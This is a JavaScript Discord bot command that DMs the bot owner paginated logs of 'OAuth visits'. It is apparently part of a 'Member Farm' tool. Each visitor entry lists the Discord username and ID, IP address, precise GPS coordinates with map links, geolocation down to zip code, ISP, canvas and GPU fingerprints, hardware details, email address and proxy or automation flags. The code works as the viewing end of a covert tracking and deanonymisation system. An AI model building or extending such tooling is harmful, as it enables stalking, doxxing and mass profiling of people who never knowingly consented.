// language: JavaScript, file: visits_cmd.js
const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const { many, one } = require('./db');
const config = require('./config');

function trunc(s, n) {
  if (s == null || s === '') return '—';
  s = String(s);
  return s.length > n ? s.slice(0, n - 1) + '…' : s;
}

function formatVisit(v) {
  const who = v.username
    ? '**' + v.username + '**' + (v.global_name ? ' (' + v.global_name + ')' : '')
    : 'unknown';
  const uid = v.user_id ? '`' + v.user_id + '`' : '—';
  const geo = [v.district, v.city, v.region, v.country, v.zip].filter(Boolean).join(', ') || '—';
  const flags = [];
  if (v.proxy === 'true') flags.push('PROXY');
  if (v.hosting === 'true') flags.push('HOSTING');
  if (v.webdriver === 'true') flags.push('WEBDRIVER');
  if (v.mfa_enabled) flags.push('MFA');
  if (v.verified) flags.push('VERIFIED');
  if (v.gps_lat && v.gps_lon) flags.push('GPS');

  const lines = [
    '**#' + v.id + '** · `' + (v.status || '—') + '` · <t:' + (v.created_at || 0) + ':R>',
    'User: ' + who + ' · ' + uid,
    'IP: `' + trunc(v.ip, 48) + '`' + (flags.length ? ' · ' + flags.join(' · ') : ''),
  ];

  if (v.gps_lat && v.gps_lon) {
    lines.push(
      '**GPS:** `' + v.gps_lat + ', ' + v.gps_lon + '`' +
        (v.gps_accuracy ? ' ±' + Math.round(Number(v.gps_accuracy)) + 'm' : '')
    );
    if (v.gps_altitude) lines.push('Alt: ' + trunc(v.gps_altitude, 12) + 'm');
    const maps = v.maps_url || ('https://www.google.com/maps?q=' + v.gps_lat + ',' + v.gps_lon);
    lines.push('[Open Maps](' + maps + ')');
  } else if (v.gps_error) {
    lines.push('GPS: denied (`' + trunc(v.gps_error, 40) + '`)');
  }

  lines.push('IP-Geo: ' + trunc(geo, 90) + (v.geo_source ? ' · ' + v.geo_source : ''));
  if (v.lat && v.lon && !(v.gps_lat && v.gps_lon)) {
    lines.push('IP coords: `' + v.lat + ', ' + v.lon + '`');
    lines.push('[IP Maps](https://www.google.com/maps?q=' + v.lat + ',' + v.lon + ')');
  }

  lines.push('ASN: ' + trunc(v.asn || v.as_name, 50));
  lines.push('ISP: ' + trunc(v.isp || v.org, 60));
  lines.push('UA: ' + trunc(v.user_agent, 90));
  if (v.sec_ch_ua) lines.push('UA-CH: ' + trunc(v.sec_ch_ua, 80));
  lines.push(
    'Screen: ' + trunc(v.screen, 28) +
      ' · Platform: ' + trunc(v.platform || v.vendor, 24) +
      ' · TZ: ' + trunc(v.client_timezone || v.timezone, 28)
  );
  if (v.webgl_renderer) lines.push('GPU: ' + trunc(v.webgl_renderer, 70));
  if (v.canvas_hash) lines.push('Canvas: `' + trunc(v.canvas_hash, 40) + '`');
  if (v.connection_type || v.downlink) {
    lines.push(
      'Net: ' + trunc(v.connection_type, 16) +
        (v.downlink ? ' · ' + v.downlink + 'Mbps' : '') +
        (v.rtt ? ' · rtt ' + v.rtt + 'ms' : '')
    );
  }
  if (v.hardware_concurrency || v.device_memory) {
    lines.push(
      'HW: ' +
        (v.hardware_concurrency ? v.hardware_concurrency + ' cores' : '') +
        (v.device_memory ? ' · ' + v.device_memory + 'GB RAM' : '')
    );
  }
  if (v.email) lines.push('Email: `' + trunc(v.email, 40) + '`');
  if (v.premium_type != null) lines.push('Premium: `' + v.premium_type + '`');
  if (v.public_flags) lines.push('Flags: `' + v.public_flags + '`');
  if (v.error) lines.push('Error: ' + trunc(v.error, 80));

  return lines.join('\n');
}

async function handleVisits(message, client, args) {
  if (String(message.author.id) !== String(config.OWNER_ID)) return;

  const filterUser = args[0] && /^\d{17,20}$/.test(args[0]) ? args[0] : null;
  const limit = 100;
  let visits;
  if (filterUser) {
    visits = await many('SELECT * FROM oauth_visits WHERE user_id = $1 ORDER BY id DESC LIMIT $2', [filterUser, limit]);
  } else {
    visits = await many('SELECT * FROM oauth_visits ORDER BY id DESC LIMIT $1', [limit]);
  }

  if (!visits.length) {
    await message.author.send('No OAuth visits logged yet.').catch(() => {});
    await message.reply('No visits found.').catch(() => {});
    return;
  }

  const total = filterUser
    ? (await one('SELECT COUNT(*)::int AS c FROM oauth_visits WHERE user_id = $1', [filterUser]))?.c || visits.length
    : (await one('SELECT COUNT(*)::int AS c FROM oauth_visits'))?.c || visits.length;

  const perPage = 2;
  const pages = [];
  for (let i = 0; i < visits.length; i += perPage) {
    const chunk = visits.slice(i, i + perPage);
    const desc = chunk.map(formatVisit).join('\n\n—————\n\n');
    pages.push(
      new EmbedBuilder()
        .setTitle('OAuth Visits (' + (Math.floor(i / perPage) + 1) + '/' + Math.ceil(visits.length / perPage) + ')')
        .setDescription(desc.slice(0, 4000))
        .setColor(0x5865f2)
        .setFooter({
          text: 'Member Farm · ' + total + ' total' + (filterUser ? ' · user ' + filterUser : '') + ' · last ' + visits.length,
        })
        .setTimestamp()
    );
  }

  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId('visits_prev').setLabel('◀').setStyle(ButtonStyle.Secondary),
    new ButtonBuilder().setCustomId('visits_next').setLabel('▶').setStyle(ButtonStyle.Secondary)
  );

  const dm = await message.author.send({ embeds: [pages[0]], components: pages.length > 1 ? [row] : [] });
  if (pages.length > 1) {
    if (!client.visitsPages) client.visitsPages = new Map();
    client.visitsPages.set(dm.id, { pages, index: 0, owner: message.author.id });
  }
  await message.reply('Sent visits in DM.' + (filterUser ? ' (filtered)' : '')).catch(() => {});
}

module.exports = { handleVisits };
